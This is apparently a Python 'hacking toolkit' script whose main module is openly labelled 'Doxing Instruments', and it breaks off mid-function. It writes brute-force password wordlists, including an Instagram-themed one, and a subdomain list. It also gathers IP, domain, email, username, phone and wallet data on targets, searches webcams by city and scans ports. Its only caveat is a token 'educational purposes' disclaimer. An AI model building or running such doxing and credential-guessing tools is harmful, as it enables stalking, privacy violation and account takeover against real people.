import os
import sys
import subprocess
import platform
import json
import time
import random
import string
import hashlib
import re
import requests
import threading
import socket
import smtplib
import webbrowser
from datetime import datetime
import argparse
import math
from fake_useragent import UserAgent
import pyfiglet
from termcolor import colored
from pystyle import Colors, Colorate, Center
from bs4 import BeautifulSoup
from colorama import Fore, init as colorama_init

colorama_init(autoreset=True)

def setup_working_directory():
    if getattr(sys, "frozen", False):
        script_dir = os.path.dirname(sys.executable)
    else:
        script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    create_necessary_files()
    return script_dir

def create_necessary_files():
    files_to_create = {
        "passwords.txt": [
            "password123", "123456", "qwerty", "admin", "letmein",
            "welcome", "monkey", "dragon", "12345678", "123456789",
            "1234567890", "123123", "111111", "password1", "admin123",
            "iloveyou", "sunshine", "princess", "football", "baseball"
        ],
        "pass.txt": [
            "password123", "123456", "qwerty", "instagram", "insta123",
            "iloveyou", "sunshine", "princess", "football", "baseball",
            "dragon", "monkey", "letmein", "admin", "welcome"
        ],
        "wordlist.txt": [
            "admin", "root", "user", "test", "password", "123456", "qwerty",
            "abc123", "letmein", "welcome", "monkey", "dragon", "master",
            "sunshine", "iloveyou", "princess", "football", "baseball"
        ],
        "subdomains.txt": [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop",
            "ns1", "webdisk", "ns2", "cpanel", "whm", "autodiscover",
            "autoconfig", "m", "imap", "test", "ns", "blog", "pop3",
            "dev", "www2", "admin", "forum", "news", "vpn", "ns3",
            "mail2", "new", "mysql", "old", "lists", "support", "mobile",
            "mx", "static", "docs", "beta", "shop", "sql", "secure",
            "demo", "cp", "calendar", "wiki", "web", "media", "email",
            "images", "img", "download", "dns", "piwik", "stats", "dashboard"
        ]
    }
    for filename, items in files_to_create.items():
        if not os.path.exists(filename):
            print(f"📄 Creating {filename}...")
            with open(filename, "w", encoding="utf-8") as f:
                for item in items:
                    f.write(f"{item}\n")
            print(f"✅ File {filename} created")

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def check_python_version():
    if sys.version_info < (3, 7):
        print("❌ Requires Python 3.7 or higher!")
        print(f"🚫 Current version: {platform.python_version()}")
        return False
    return True

def install_dependencies():
    print("🔧 Checking and installing dependencies...\n")
    required_libs = {
        "requests": "requests",
        "fake_useragent": "fake-useragent",
        "pyfiglet": "pyfiglet",
        "termcolor": "termcolor",
        "pystyle": "pystyle",
        "colorama": "colorama",
        "beautifulsoup4": "beautifulsoup4",
        "cryptography": "cryptography",
        "paramiko": "paramiko",
        "scapy": "scapy",
        "dnspython": "dnspython",
        "whois": "python-whois",
        "phonenumbers": "phonenumbers",
        "validators": "validators",
        "tldextract": "tldextract",
        "pyOpenSSL": "pyOpenSSL",
        "censys": "censys",
        "shodan": "shodan",
        "python-nmap": "python-nmap",
        "dnsrecon": "dnsrecon",
        "theHarvester": "theHarvester"
    }
    import importlib.util
    installed = 0
    failed = []
    print("📦 Installation may take a few minutes...")
    print("📋 List of libraries to install:")
    for lib in required_libs.values():
        print(f"   • {lib}")
    print()
    for display_name, pip_name in required_libs.items():
        try:
            spec = importlib.util.find_spec(display_name)
            if spec is None:
                print(f"📦 Installing {display_name} ({pip_name})...")
                try:
                    subprocess.check_call(
                        [sys.executable, "-m", "pip", "install", pip_name],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    print(f"✅ {display_name} installed successfully")
                    installed += 1
                except subprocess.CalledProcessError:
                    print(f"⚠️ Problem installing {display_name}")
                    try:
                        subprocess.check_call(
                            [sys.executable, "-m", "pip", "install", pip_name]
                        )
                        print(f"✅ {display_name} installed")
                        installed += 1
                    except:
                        print(f"❌ Installation error {display_name}")
                        failed.append(display_name)
            else:
                print(f"✅ {display_name} already installed")
                installed += 1
            time.sleep(0.3)
        except Exception as e:
            print(f"⚠️ Error checking {display_name}: {str(e)[:50]}...")
            failed.append(display_name)
    print(f"\n{'═' * 50}")
    print(f"📊 INSTALLATION RESULTS:")
    print(f"✅ Successfully installed: {installed}/{len(required_libs)}")
    if failed:
        print(f"❌ Failed to install: {len(failed)}")
        print("List of problematic libraries:")
        for lib in failed:
            print(f"   - {lib}")
        print(f"\n💡 Recommendations:")
        print(f"1. Try manual installation: pip install {' '.join(failed)}")
        print(f"2. Check your internet connection")
        print(f"3. Run as administrator")
    else:
        print(f"🎉 All libraries installed successfully!")
    print(f"{'═' * 50}")
    time.sleep(3)
    return len(failed) == 0

class ColorManager:
    def __init__(self):
        self.gradient_colors = [
            ["\033[38;2;255;0;255m", "\033[38;2;0;255;255m"],
            ["\033[38;2;255;105;180m", "\033[38;2;135;206;235m"],
            ["\033[38;2;0;255;127m", "\033[38;2;138;43;226m"],
            ["\033[38;2;255;215;0m", "\033[38;2;220;20;60m"],
            ["\033[38;2;64;224;208m", "\033[38;2;255;20;147m"],
            ["\033[38;2;255;99;71m", "\033[38;2;75;0;130m"],
            ["\033[38;2;0;255;255m", "\033[38;2;255;0;0m"],
            ["\033[38;2;50;205;50m", "\033[38;2;255;215;0m"]
        ]
        try:
            from colorama import init, Fore, Back, Style
            init(autoreset=True)
            self.Fore = Fore
            self.Back = Back
            self.Style = Style
            self.colorama_available = True
        except ImportError:
            self.colorama_available = False
            class SimpleColors:
                BLACK = ""; RED = ""; GREEN = ""; YELLOW = ""; BLUE = ""
                MAGENTA = ""; CYAN = ""; WHITE = ""; RESET = ""; BRIGHT = ""
                DIM = ""; UNDERLINE = ""
            self.Fore = SimpleColors()
            self.Style = SimpleColors()
            self.Back = SimpleColors()

    def print_3d_ascii_header(self):
        clear_screen()
        hack_ascii = """
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                          ║
║    ██╗  ██╗ █████╗  ██████╗██╗  ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗               ║
║    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝               ║
║    ███████║███████║██║     █████╔╝    ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║                  ║
║    ██╔══██║██╔══██║██║     ██╔═██╗    ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║                  ║
║    ██║  ██║██║  ██║╚██████╗██║  ██╗   ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║                  ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝                  ║
║                                                                                                          ║
║    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗     ████████╗ ██████╗  ██████╗ ██╗     ║
║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝     ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ║
║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝         ██║   ██║   ██║██║   ██║██║     ║
║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝          ██║   ██║   ██║██║   ██║██║     ║
║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║           ██║   ╚██████╔╝╚██████╔╝███████╗║
║    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝║
║                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""
        lines = hack_ascii.strip("\n").split("\n")
        shadow_offset = 2
        for line in lines:
            shadow_line = " " * shadow_offset + line
            print(f"\033[38;2;40;40;40m{shadow_line}\033[0m")
        cursor_up = f"\033[{len(lines)}A"
        print(cursor_up, end="")
        for i, line in enumerate(lines):
            ratio = i / max(1, len(lines) - 1)
            if i < len(lines) // 3:
                r = 0 + int(100 * ratio)
                g = 255 - int(100 * ratio)
                b = 0 + int(50 * ratio)
            elif i < 2 * len(lines) // 3:
                r = 255
                g = 165 + int(50 * ratio)
                b = 0
            else:
                r = 255 - int(50 * (1 - ratio))
                g = 0
                b = 0
            color_code = f"\033[38;2;{r};{g};{b}m"
            print(f"\033[{i+1};0H{color_code}{line}\033[0m")
        print("\n" * 2)
        self.print_gradient_text("═" * 100)
        self.print_gradient_text("           🔒 SECURITY TOOLKIT v5.0 | ULTIMATE HACKING TOOLKIT | BY @CONCOLE_HACK          ")
        self.print_gradient_text("═" * 100)
        print("\n")

    def print_gradient_text(self, text, color_pair=None):
        if color_pair is None:
            color_pair = random.choice(self.gradient_colors)
        start_color, end_color = color_pair
        reset = "\033[0m"
        result = ""
        length = len(text)
        for i, char in enumerate(text):
            if char == " ":
                result += char
                continue
            ratio = i / max(1, length - 1)
            try:
                start_rgb = tuple(map(int, start_color[7:-1].split(";")))
                end_rgb = tuple(map(int, end_color[7:-1].split(";")))
            except:
                start_rgb = (255, 0, 255)
                end_rgb = (0, 255, 255)
            r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * ratio)
            g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * ratio)
            b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * ratio)
            result += f"\033[38;2;{r};{g};{b}m{char}"
        print(result + reset)

    def print_header(self, title, symbol="═"):
        width = 98
        border = symbol * width
        centered_title = title.center(width)
        self.print_gradient_text(border)
        self.print_gradient_text(centered_title)
        self.print_gradient_text(border + "\n")

    def print_success(self, message):
        print(f"\033[38;2;0;255;127m✅ {message}\033[0m")

    def print_error(self, message):
        print(f"\033[38;2;255;69;0m❌ {message}\033[0m")

    def print_warning(self, message):
        print(f"\033[38;2;255;215;0m⚠️  {message}\033[0m")

    def print_info(self, message):
        print(f"\033[38;2;135;206;235mℹ️  {message}\033[0m")

    def print_menu_item(self, number, emoji, description):
        text = f"[{number}] {emoji} {description}"
        color_pair = random.choice(self.gradient_colors)
        self.print_gradient_text(text, color_pair)

    def animate_text(self, text, delay=0.03, color_pair=None):
        if color_pair is None:
            color_pair = random.choice(self.gradient_colors)
        start_color, end_color = color_pair
        length = len(text)
        for i, char in enumerate(text):
            if char == " ":
                print(char, end="", flush=True)
                continue
            ratio = i / max(1, length - 1)
            try:
                start_rgb = tuple(map(int, start_color[7:-1].split(";")))
                end_rgb = tuple(map(int, end_color[7:-1].split(";")))
            except:
                start_rgb = (255, 0, 255)
                end_rgb = (0, 255, 255)
            r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * ratio)
            g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * ratio)
            b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * ratio)
            print(f"\033[38;2;{r};{g};{b}m{char}\033[0m", end="", flush=True)
            time.sleep(delay)
        print()

    def progress_bar(self, iteration, total, prefix="", suffix="", length=50, color_pair=None):
        if color_pair is None:
            color_pair = self.gradient_colors[0]
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = ""
        for i in range(length):
            if i < filled_length:
                ratio = i / max(1, length - 1)
                try:
                    start_rgb = tuple(map(int, color_pair[0][7:-1].split(";")))
                    end_rgb = tuple(map(int, color_pair[1][7:-1].split(";")))
                except:
                    start_rgb = (255, 0, 255)
                    end_rgb = (0, 255, 255)
                r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * ratio)
                g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * ratio)
                b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * ratio)
                bar += f"\033[38;2;{r};{g};{b}m█\033[0m"
            else:
                bar += "░"
        print(f"\r{prefix} |{bar}| {percent}% {suffix}", end="\r")
        if iteration == total:
            print()

class DOXModule:
    def __init__(self, color_manager):
        self.color = color_manager
        self.payload = {}
        self.headers = {"x-api-key": "API"}

    def print_help(self):
        help_text = """
┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                      DOXING INSTRUMENTS                                             │
├────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                    │
│  🎯 BASIC COMMANDS:                                                                                │
│                                                                                                    │
│   [-h]                 - Display this help message                                                 │
│   [-ip] <IP address>   - Full information by IP address                                           │
│   [-domain] <domain>   - Full information by domain                                               │
│   [-email] <email>     - Email information and breach check                                       │
│   [-username] <user>   - Username search across platforms                                         │
│                                                                                                    │
│  📊 ADDITIONAL OPTIONS (used with -ip):                                                            │
│                                                                                                    │
│   [-o]                 - Save result to output.txt                                                │
│   [-S]                 - Show summary by IP                                                       │
│   [-V]                 - Check VPN usage                                                          │
│   [-H]                 - Check hosting                                                            │
│   [-M]                 - Check for malicious activity                                             │
│   [-P]                 - Check privacy threats                                                    │
│   [-Safe]              - Check DNS server safety                                                  │
│   [-ports]             - Scan open ports                                                          │
│   [-geo]               - Detailed geolocation                                                     │
│   [-history]           - IP history and reputation                                                │
│                                                                                                    │
│  🌍 SPECIAL TOOLS:                                                                                 │
│                                                                                                    │
│   [-CAM] -Country <country> -City <city>                                                          │
│          - Search for webcams in specified city                                                   │
│                                                                                                    │
│   [-GOOGLEMAPS] -LONG <longitude> -LAT <latitude>                                                 │
│          - Search location on Google Maps                                                         │
│                                                                                                    │
│   [-PHONE] <phone>   - Phone number information and OSINT                                         │
│   [-BTC] <address>   - Bitcoin wallet analysis                                                    │
│   [-ETH] <address>   - Ethereum wallet analysis                                                   │
│                                                                                                    │
│  📝 USAGE EXAMPLES:                                                                                │
│                                                                                                    │
│   • python hack_toolkit.py --dox -ip 8.8.8.8                                                      │
│   • python hack_toolkit.py --dox -ip 8.8.8.8 -o -S -V                                             │
│   • python hack_toolkit.py --dox -domain google.com -o                                            │
│   • python hack_toolkit.py --dox -email test@gmail.com -S                                         │
│   • python hack_toolkit.py --dox -username john_doe                                               │
│   • python hack_toolkit.py --dox -CAM -Country USA -City NewYork                                  │
│   • python hack_toolkit.py --dox -GOOGLEMAPS -LONG 40.7128 -LAT -74.0060                          │
│   • python hack_toolkit.py --dox -PHONE +1234567890                                               │
│   • python hack_toolkit.py --dox -BTC 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa                         │
│                                                                                                    │
│  ⚠️  WARNING:                                                                                      │
│     This tool is for educational purposes only and testing own systems.                           │
│     Do not use for illegal actions or violation of others' privacy.                               │
│                                                                                                    │
└────────────────────────────────────────────────────────────────────────────────────────────────────┘
"""
        self.color.animate_text(help_text, delay=0.001)

    def print_banner(self):
        banner = """
                               /T /I
                              / |/ | .-~/
                          T\ Y  I  |/  /  _
         /T               | \I  |  I  Y.-~/
        I l   /I       T\ |  |  l  |  T  /
     T\ |  \ Y l  /T   | \I  l   \ `  l Y
 __  | \l   \l  \I l __l  l   \   `  _. |
 \ ~-l  `\   `\  \  \  ~\  \   `. .-~   |
  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
 >--.  ~-.   ._  ~>-"    " \   7   7   ]
^.___~"--._    ~-{  .-~ .  `\ Y . /    |
 <__ ~"-.  ~       /_/   \   \I  Y   : |
   ^-.__           ~(_/   \   >._:   | l______
       ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
              (_/ .  ~(   /'     "~"--,Y   -=b-. _)
               (_/ .  \  :           / l      c"~o \ 
                \ /    `.    .     .^   \_.-~"~--.  )
                 (_/ .   `  /     /       !       )/
                  / / _.   '.   .':      /        '
                  ~(_/ .   /    _  `  .-<_
                    /_/ . ' .-~" `.  / \  \          ,z=.
                    ~( /   '  :   | K   "-.~-.______//
                      "-,.    l   I/ \_    __{--->._(==.
                       //(     \  <    ~"~"     //
                      /' /\     \  \     ,v=.  ((
                    .^. / /\     "  }__ //===-  `
                   / / ' '  "-.,__ {---(==-
                 .^ '       :  T  ~"   ll       
                / .  .  . : | :!        \ 
               (_/  /   | | j-"          ~^
                 ~-<_(_.^-~"
"""
        print(Fore.GREEN + banner)

    def search_cams(self, country, city):
        self.color.print_header("📹 WEBCAM SEARCH", "─")
        url = f"https://www.criminalip.io/en/asset/search?query=webcam+country%3A+{country}+city%3A+{city}"
        self.color.print_info(f"🌍 Country: {country}")
        self.color.print_info(f"🏙️ City: {city}")
        self.color.print_success(f"🔗 Search link: {url}")
        webbrowser.open(url)
        return url

    def search_google_maps(self, longitude, latitude):
        self.color.print_header("🗺️ GOOGLE MAPS SEARCH", "─")
        self.color.print_warning("⚠️ IMPORTANT: When using coordinates from other tools")
        self.color.print_warning("swap longitude and latitude!")
        url = f"https://www.google.com/maps/place/{longitude}+{latitude}/"
        self.color.print_info(f"📍 Longitude: {longitude}")
        self.color.print_info(f"📍 Latitude: {latitude}")
        self.color.print_success(f"🔗 Google Maps link: {url}")
        webbrowser.open(url)
        return url

    def get_ip_info(self, ip, save_to_file=False, options=None):
        if options is None:
            options = {}
        self.color.print_header(f"🌐 IP ADDRESS ANALYSIS: {ip}", "─")
        try:
            self.color.print_info("🔍 Getting WHOIS information...")
            response = requests.get(f"http://who.is/whois-ip/ip-address/{ip}")
            soup = BeautifulSoup(response.content, "html.parser")
            pre_tag = soup.find("pre")
            if pre_tag:
                whois_info = pre_tag.text.strip()
                print("\n📋 WHOIS INFORMATION:")
                print("─" * 70)
                print(whois_info)
            else:
                self.color.print_warning("WHOIS information not found")
            print("\n📍 GEOLOCATION:")
            print("─" * 70)
            print(f"🌍 Map: https://db-ip.com/{ip}")
            self.color.print_info("\n🔍 Requesting extended information via Criminal IP API...")
            url = f"https://api.criminalip.io/v1/ip/data?ip={ip}"
            response = requests.request("GET", url, headers=self.headers, data=self.payload)
            if response.status_code == 200:
                json_response = json.loads(response.text)
                print("\n📊 DETAILED INFORMATION:")
                print("─" * 70)
                print(json.dumps(json_response, indent=2))
            else:
                self.color.print_error(f"API Error: {response.status_code}")
            if options.get("summary", False):
                self.get_ip_summary(ip)
            if options.get("vpn", False):
                self.check_vpn(ip)
            if options.get("hosting", False):
                self.check_hosting(ip)
            if options.get("malicious", False):
                self.check_malicious(ip)
            if options.get("privacy", False):
                self.check_privacy_threat(ip)
            if options.get("safe_dns", False):
                self.check_safe_dns(ip)
            if options.get("ports", False):
                self.scan_ports(ip)
            if options.get("geo", False):
                self.get_detailed_geo(ip)
            if options.get("history", False):
                self.get_ip_history(ip)
            if save_to_file:
                self.save_ip_report(ip, whois_info, json_response if "json_response" in locals() else None, options)
        except requests.exceptions.RequestException as e:
            self.color.print_error(f"Network error: {e}")
        except Exception as e:
            self.color.print_error(f"Error: {e}")

    def get_domain_info(self, domain, save_to_file=False):
        self.color.print_header(f"🌐 DOMAIN ANALYSIS: {domain}", "─")
        try:
            import whois
            w = whois.whois(domain)
            print("\n📋 WHOIS INFORMATION:")
            print("─" * 70)
            for key, value in w.items():
                if value:
                    print(f"  {key}: {value}")
            dns_servers = []
            try:
                import dns.resolver
                answers = dns.resolver.resolve(domain, 'NS')
                for rdata in answers:
                    dns_servers.append(str(rdata))
                print(f"\n🌐 DNS Servers: {', '.join(dns_servers)}")
            except:
                pass
            try:
                ip_address = socket.gethostbyname(domain)
                print(f"\n🔍 Resolved IP: {ip_address}")
                self.get_ip_info(ip_address, save_to_file, {"summary": True})
            except:
                pass
            if save_to_file:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"domain_report_{domain}_{timestamp}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write("=" * 80 + "\n")
                    f.write(f"DOMAIN REPORT: {domain}\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 80 + "\n\n")
                    for key, value in w.items():
                        if value:
                            f.write(f"{key}: {value}\n")
                self.color.print_success(f"✅ Report saved: {filename}")
        except Exception as e:
            self.color.print_error(f"Error: {e}")

    def get_email_info(self, email, save_to_file=False):
        self.color.print_header(f"📧 EMAIL ANALYSIS: {email}", "─")
        try:
            breaches = []
            try:
                response = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", 
                                       headers={"hibp-api-key": "demo"}, timeout=10)
                if response.status_code == 200:
                    breaches = response.json()
            except:
                pass
            if breaches:
                self.color.print_warning(f"⚠️ Found {len(breaches)} breaches!")
                for breach in breaches:
                    print(f"  - {breach.get('Name', 'Unknown')}: {breach.get('BreachDate', 'Unknown date')}")
            else:
                self.color.print_success("✅ No breaches found")
            domain = email.split('@')[-1]
            self.color.print_info(f"📧 Domain: {domain}")
            try:
                mx_records = []
                import dns.resolver
                answers = dns.resolver.resolve(domain, 'MX')
                for rdata in answers:
                    mx_records.append(str(rdata.exchange))
                print(f"📨 MX Records: {', '.join(mx_records)}")
            except:
                pass
            if save_to_file:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"email_report_{email.replace('@', '_')}_{timestamp}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write("=" * 80 + "\n")
                    f.write(f"EMAIL REPORT: {email}\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 80 + "\n\n")
                    if breaches:
                        f.write(f"Breaches found: {len(breaches)}\n")
                        for breach in breaches:
                            f.write(f"  - {breach}\n")
                    else:
                        f.write("No breaches found\n")
                self.color.print_success(f"✅ Report saved: {filename}")
        except Exception as e:
            self.color.print_error(f"Error: {e}")

    def get_username_info(self, username, save_to_file=False):
        self.color.print_header(f"👤 USERNAME SEARCH: {username}", "─")
        platforms = [
            ("GitHub", f"https://github.com/{username}"),
            ("Twitter", f"https://twitter.com/{username}"),
            ("Instagram", f"https://instagram.com/{username}"),
            ("Reddit", f"https://reddit.com/user/{username}"),
            ("Telegram", f"https://t.me/{username}"),
            ("Facebook", f"https://facebook.com/{username}"),
            ("LinkedIn", f"https://linkedin.com/in/{username}"),
            ("YouTube", f"https://youtube.com/@{username}"),
            ("TikTok", f"https://tiktok.com/@{username}"),
            ("Pinterest", f"https://pinterest.com/{username}"),
            ("Twitch", f"https://twitch.tv/{username}"),
            ("Steam", f"https://steamcommunity.com/id/{username}"),
            ("Spotify", f"https://open.spotify.com/user/{username}"),
            ("Medium", f"https://medium.com/@{username}"),
            ("Dev.to", f"https://dev.to/{username}"),
        ]
        found = []
        for name, url in platforms:
            try:
                response = requests.get(url, timeout=5, allow_redirects=True)
                if response.status_code == 200:
                    found.append((name, url))
                    self.color.print_success(f"✅ Found on {name}: {url}")
                else:
                    print(f"❌ Not found on {name}")
            except:
                print(f"⚠️ Error checking {name}")
            time.sleep(0.3)
        if save_to_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"username_report_{username}_{timestamp}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 80 + "\n")
                f.write(f"USERNAME REPORT: {username}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Found on {len(found)} platforms:\n\n")
                for name, url in found:
                    f.write(f"{name}: {url}\n")
            self.color.print_success(f"✅ Report saved: {filename}")

    def get_phone_info(self, phone, save_to_file=False):
        self.color.print_header(f"📞 PHONE NUMBER ANALYSIS: {phone}", "─")
        try:
            import phonenumbers
            from phonenumbers import carrier, geocoder, timezone
            parsed = phonenumbers.parse(phone, None)
            if phonenumbers.is_valid_number(parsed):
                country = geocoder.description_for_number(parsed, "en")
                operator = carrier.name_for_number(parsed, "en")
                tzones = timezone.time_zones_for_number(parsed)
                print(f"📍 Country: {country}")
                print(f"📡 Operator: {operator}")
                print(f"🕐 Timezone: {', '.join(tzones)}")
                print(f"🔢 National number: {parsed.national_number}")
                print(f"🌍 Country code: +{parsed.country_code}")
            else:
                self.color.print_error("Invalid phone number")
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        if save_to_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"phone_report_{phone}_{timestamp}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 80 + "\n")
                f.write(f"PHONE REPORT: {phone}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n")
            self.color.print_success(f"✅ Report saved: {filename}")

    def get_bitcoin_info(self, address, save_to_file=False):
        self.color.print_header(f"₿ BITCOIN ADDRESS ANALYSIS: {address}", "─")
        try:
            response = requests.get(f"https://blockchain.info/q/addressbalance/{address}", timeout=10)
            if response.status_code == 200:
                balance = int(response.text) / 100000000
                print(f"💰 Balance: {balance} BTC")
            response = requests.get(f"https://blockchain.info/rawaddr/{address}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                print(f"📊 Total transactions: {data.get('n_tx', 0)}")
                print(f"💸 Total sent: {data.get('total_sent', 0) / 100000000} BTC")
                print(f"💵 Total received: {data.get('total_received', 0) / 100000000} BTC")
        except Exception as e:
            self.color.print_error(f"Error: {e}")

    def get_ethereum_info(self, address, save_to_file=False):
        self.color.print_header(f"⟠ ETHEREUM ADDRESS ANALYSIS: {address}", "─")
        try:
            response = requests.get(f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey=demo", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == '1':
                    balance = int(data.get('result', 0)) / 1000000000000000000
                    print(f"💰 Balance: {balance} ETH")
        except Exception as e:
            self.color.print_error(f"Error: {e}")

    def scan_ports(self, ip):
        self.color.print_header(f"🔌 PORT SCANNING: {ip}", "─")
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]
        open_ports = []
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                    self.color.print_success(f"✅ Port {port} is OPEN")
                sock.close()
            except:
                pass
        if open_ports:
            print(f"\n📊 Open ports: {', '.join(map(str, open_ports))}")
        else:
            self.color.print_warning("No common open ports found")

    def get_detailed_geo(self, ip):
        self.color.print_header(f"🗺️ DETAILED GEOLOCATION: {ip}", "─")
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    print(f"🌍 Country: {data.get('country', 'N/A')}")
                    print(f"🏙️ Region: {data.get('regionName', 'N/A')}")
                    print(f"📍 City: {data.get('city', 'N/A')}")
                    print(f"📮 ZIP: {data.get('zip', 'N/A')}")
                    print(f"📡 ISP: {data.get('isp', 'N/A')}")
                    print(f"🏢 Organization: {data.get('org', 'N/A')}")
                    print(f"📍 Coordinates: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}")
                    print(f"🕐 Timezone: {data.get('timezone', 'N/A')}")
        except Exception as e:
            self.color.print_error(f"Error: {e}")

    def get_ip_history(self, ip):
        self.color.print_header(f"📜 IP HISTORY: {ip}", "─")
        try:
            response = requests.get(f"https://api.criminalip.io/v1/ip/history?ip={ip}", headers=self.headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                print(json.dumps(data, indent=2))
            else:
                self.color.print_warning("No history data available")
        except Exception as e:
            self.color.print_error(f"Error: {e}")

    def get_ip_summary(self, ip):
        try:
            url = f"https://api.criminalip.io/v1/ip/summary?ip={ip}"
            response = requests.request("GET", url, headers=self.headers, data=self.payload)
            print("\n📈 IP SUMMARY:")
            print("─" * 70)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Error getting summary: {e}")

    def check_vpn(self, ip):
        try:
            url = f"https://api.criminalip.io/v1/ip/vpn?ip={ip}"
            response = requests.request("GET", url, headers=self.headers, data=self.payload)
            print("\n🔒 VPN CHECK:")
            print("─" * 70)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Error checking VPN: {e}")

    def check_hosting(self, ip):
        try:
            url = f"https://api.criminalip.io/v1/ip/hosting?ip={ip}"
            response = requests.request("GET", url, headers=self.headers, data=self.payload)
            print("\n🏢 HOSTING CHECK:")
            print("─" * 70)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Error checking hosting: {e}")

    def check_malicious(self, ip):
        try:
            url = f"https://api.criminalip.io/v1/ip/malicious-info?ip={ip}"
            response = requests.request("GET", url, headers=self.headers, data=self.payload)
            print("\n⚠️ MALICIOUS ACTIVITY CHECK:")
            print("─" * 70)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Error checking malicious activity: {e}")

    def check_privacy_threat(self, ip):
        try:
            url = f"https://api.criminalip.io/v1/ip/privacy-threat?ip={ip}"
            response = requests.request("GET", url, headers=self.headers, data=self.payload)
            print("\n🔐 PRIVACY THREAT CHECK:")
            print("─" * 70)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Error checking privacy threats: {e}")

    def check_safe_dns(self, ip):
        try:
            url = f"https://api.criminalip.io/v1/ip/is_safe_dns_server?ip={ip}"
            response = requests.request("GET", url, headers=self.headers, data=self.payload)
            print("\n🛡️ DNS SAFETY CHECK:")
            print("─" * 70)
            print(response.text)
        except Exception as e:
            self.color.print_error(f"Error checking DNS safety: {e}")

    def save_ip_report(self, ip, whois_info, api_info, options):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"ip_report_{ip}_{timestamp}.txt"
            with open(filename, "w", encoding="utf-8") as file:
                file.write("=" * 80 + "\n")
                file.write(f"IP ADDRESS REPORT: {ip}\n")
                file.write(f"Date created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                file.write("=" * 80 + "\n\n")
